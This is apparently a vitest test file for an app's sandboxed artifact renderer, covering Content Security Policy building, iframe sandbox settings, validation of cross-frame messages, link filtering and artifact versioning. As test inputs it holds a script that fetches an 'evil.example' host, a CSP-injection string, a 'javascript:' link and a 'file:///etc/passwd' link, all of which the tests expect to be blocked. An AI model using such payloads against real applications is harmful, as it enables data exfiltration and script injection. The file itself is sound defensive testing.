import type { Artifact } from "@psyche/protocol";
import { describe, expect, it } from "vitest";
import {
  ARTIFACT_SANDBOX,
  artifactHostHeaders,
  artifactHostPage,
  artifactSlug,
  BRIDGE_TAG,
  buildArtifactCsp,
  buildArtifactSrcdoc,
  MAX_ARTIFACT_HEIGHT,
  parseBridgeMessage,
  safeLink,
  upsertArtifact,
} from "../src/core/artifact.ts";

describe("artifact srcdoc", () => {
  it("uses allow-scripts only, never allow-same-origin", () => {
    expect(ARTIFACT_SANDBOX).toBe("allow-scripts");
    expect(ARTIFACT_SANDBOX).not.toContain("same-origin");
  });

  it("puts the CSP meta first in head, before any artifact content", () => {
    const html =
      '<script>fetch(\'https://evil.example\')</script><meta http-equiv="Content-Security-Policy" content="default-src *">';
    const { srcdoc, csp } = buildArtifactSrcdoc(html, { allowScripts: true });
    const metaAt = srcdoc.indexOf('http-equiv="Content-Security-Policy"');
    expect(metaAt).toBeGreaterThan(0);
    expect(metaAt).toBeLessThan(srcdoc.indexOf("<script"));
    expect(srcdoc.indexOf("fetch(")).toBeGreaterThan(srcdoc.indexOf("</head>"));
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).not.toMatch(/img-src[^;]*https:/);
  });

  it("allows only the nonce'd bridge when scripts are off (email)", () => {
    const { srcdoc, csp } = buildArtifactSrcdoc("<p>hi</p>", { allowScripts: false });
    const nonce = /'nonce-([0-9a-f]+)'/.exec(csp)?.[1];
    expect(nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(csp).not.toContain("unsafe-inline' ;");
    expect(csp).toMatch(/script-src 'nonce-[0-9a-f]+';/);
    expect(srcdoc).toContain(`<script nonce="${nonce}">`);
  });

  it("drops non-origin library entries and allows remote images only on request", () => {
    const csp = buildArtifactCsp(
      {
        allowScripts: true,
        allowRemoteImages: true,
        libraryOrigins: ["http://127.0.0.1:7790", "https://x/'; script-src *"],
      },
      "n",
    );
    expect(csp).toContain("http://127.0.0.1:7790");
    expect(csp).not.toContain("script-src *");
    expect(csp).toMatch(/img-src data: blob: https:/);
  });

  it("gives every frame a fresh channel and refuses huge documents", () => {
    const a = buildArtifactSrcdoc("x", { allowScripts: true });
    const b = buildArtifactSrcdoc("x", { allowScripts: true });
    expect(a.channel).not.toBe(b.channel);
    expect(() => buildArtifactSrcdoc("x".repeat(6 * 1024 * 1024), { allowScripts: true })).toThrow(
      RangeError,
    );
  });
});

describe("bridge messages", () => {
  const exp = { origin: "null", channel: "c1" };
  const msg = (m: object) => ({ tag: BRIDGE_TAG, channel: "c1", ...m });

  it("accepts well-formed messages and clamps heights", () => {
    expect(parseBridgeMessage(msg({ type: "resize", height: 120.4 }), "null", exp)).toEqual({
      type: "resize",
      height: 120,
    });
    expect(parseBridgeMessage(msg({ type: "resize", height: 1e9 }), "null", exp)).toEqual({
      type: "resize",
      height: MAX_ARTIFACT_HEIGHT,
    });
    expect(parseBridgeMessage(msg({ type: "ready" }), "null", exp)).toEqual({ type: "ready" });
  });

  it("rejects wrong origin, channel, tag or shape", () => {
    expect(parseBridgeMessage(msg({ type: "ready" }), "https://evil.example", exp)).toBeUndefined();
    expect(
      parseBridgeMessage({ ...msg({ type: "ready" }), channel: "c2" }, "null", exp),
    ).toBeUndefined();
    expect(parseBridgeMessage({ type: "ready", channel: "c1" }, "null", exp)).toBeUndefined();
    expect(parseBridgeMessage(msg({ type: "resize", height: "9" }), "null", exp)).toBeUndefined();
    expect(parseBridgeMessage(msg({ type: "eval", code: "x" }), "null", exp)).toBeUndefined();
    expect(parseBridgeMessage("ready", "null", exp)).toBeUndefined();
  });

  it("only lets http(s) and mailto links out", () => {
    expect(
      parseBridgeMessage(msg({ type: "open-link", href: "javascript:alert(1)" }), "null", exp),
    ).toBeUndefined();
    expect(
      parseBridgeMessage(msg({ type: "open-link", href: "https://a.example/x" }), "null", exp),
    ).toEqual({ type: "open-link", href: "https://a.example/x" });
    expect(safeLink("file:///etc/passwd")).toBeUndefined();
    expect(safeLink("mailto:a@b.c")).toBe("mailto:a@b.c");
  });
});

describe("hosted placement", () => {
  it("serves a host page that only talks to the app origin", () => {
    const page = artifactHostPage("http://127.0.0.1:7788", "abc");
    expect(page).toContain('"http://127.0.0.1:7788"');
    expect(page).toContain('setAttribute("sandbox","allow-scripts")');
    expect(page).not.toContain('postMessage(e.data,"*")');
    expect(() => artifactHostPage("*", "n")).toThrow();
    const h = artifactHostHeaders("http://127.0.0.1:7788");
    expect(h["Content-Security-Policy"]).toContain("frame-ancestors http://127.0.0.1:7788");
    expect(h["Content-Security-Policy"]).toContain("connect-src 'none'");
  });
});

describe("update by name", () => {
  const now = "2026-10-19T00:00:00.000Z";
  let n = 0;
  const make = { id: () => `art_${++n}`, libraryItemId: "lib_2", now };

  it("slugs titles", () => {
    expect(artifactSlug("Sleep Dashboard!")).toBe("sleep-dashboard");
    expect(artifactSlug("Café ☕ plan")).toBe("cafe-plan");
    expect(artifactSlug("!!!")).toBe("artifact");
  });

  it("creates version 1, then bumps the same artifact by name", () => {
    const first = upsertArtifact([], { title: "Sleep dashboard", type: "html" }, make);
    expect(first.created).toBe(true);
    expect(first.artifact).toMatchObject({ version: 1, nameSlug: "sleep-dashboard" });
    const existing: Artifact[] = [first.artifact];
    const second = upsertArtifact(existing, { title: "Sleep Dashboard", type: "html" }, make);
    expect(second.created).toBe(false);
    expect(second.artifact).toMatchObject({
      id: first.artifact.id,
      version: 2,
      libraryItemId: "lib_2",
    });
  });
});
